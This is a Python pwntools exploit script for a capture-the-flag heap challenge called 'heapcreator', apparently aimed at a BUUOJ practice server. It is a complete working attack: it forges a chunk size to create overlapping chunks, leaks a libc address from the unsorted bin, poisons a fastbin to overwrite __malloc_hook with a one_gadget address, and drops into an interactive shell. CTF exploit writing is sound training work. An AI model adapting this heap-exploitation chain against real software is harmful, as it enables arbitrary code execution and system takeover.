from pwn import *

context(os = 'linux', arch = 'amd64', log_level = 'debug')
# io = process('heapcreator')
io = remote('node4.buuoj.cn', 27467)
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc = ELF('libc-2.23.so')
elf = ELF('heapcreator')


def add(size, content):
    io.sendlineafter('Your choice :', '1')
    io.sendlineafter('Size of Heap : ', str(size))
    io.sendafter('Content of heap:', content)


def edit(index, content):
    io.sendlineafter('Your choice :', '2')
    io.sendlineafter('Index :', str(index))
    io.sendafter('Content of heap : ', content)


def show(index):
    io.sendlineafter('Your choice :', '3')
    io.sendlineafter('Index :', str(index))
    io.recvuntil('Content : ')


def delete(index):
    io.sendlineafter('Your choice :', '4')
    io.sendlineafter('Index :', str(index))


def leak_libc():
    global libc_base
    add(0x18, '0\n')                    # chunk0 0x00-0x20 0x20-0x40
    add(0x18, '1\n')                    # chunk1 0x40-0x60 0x60-0x80
    delete(0)                           # 0x00->0x20
    delete(1)                           # 0x40->0x60->0x00->0x20
    add(0x18, '0\n')                    # chunk0 0x40-0x60 0x60-0x80
    add(0x28, '1\n')                    # chunk1 0x00-0x20 0x80-0xb0
    add(0x68, '2\n')                    # chunk2 0x20-0x40 0xb0-0x120
    add(0x18, '3\n')                    # chunk3 0x120-0x140 0x140-0x160 
    edit(0, b'0' * 0x18 + p8(0xa1))     # overwrite chunk1->size
    delete(1)                           # fake_chunk(chunk1+chunk2) into unsorted_bin
    add(0x28, '1\n')                    # get chunk1 back and leave chunk2 in unsorted_bin
    show(2)
    libc_base = u64(io.recvn(6).ljust(8, b'\x00')) - 0x3c4b78
    log.success('libc_base: ' + hex(libc_base))


def fastbin_attack():
    __malloc_hook = libc_base + libc.sym['__malloc_hook']
    # one_gadget = libc_base + 0x4527a
    one_gadget = libc_base + 0x4526a
    delete(3)
    add(0x68, '3\n')                    # chunk3 0x120-0x140 0xb0-0x120
    delete(3)
    edit(2, p64(__malloc_hook - 0x23))  # change fastbin list
    add(0x68, '3\n')                    # chunk3 0x120-0x140 0xb0-0x120
    add(0x68, '4\n')                    # chunk4 0x140-0x160 fake_chunk
    edit(4, b'a' * 0x13 + p64(one_gadget) + b'\n')
    # gdb.attach(io)
    # pause()
    io.sendlineafter('Your choice :', '1')
    io.interactive()


if __name__ == '__main__':
    leak_libc()
    fastbin_attack()
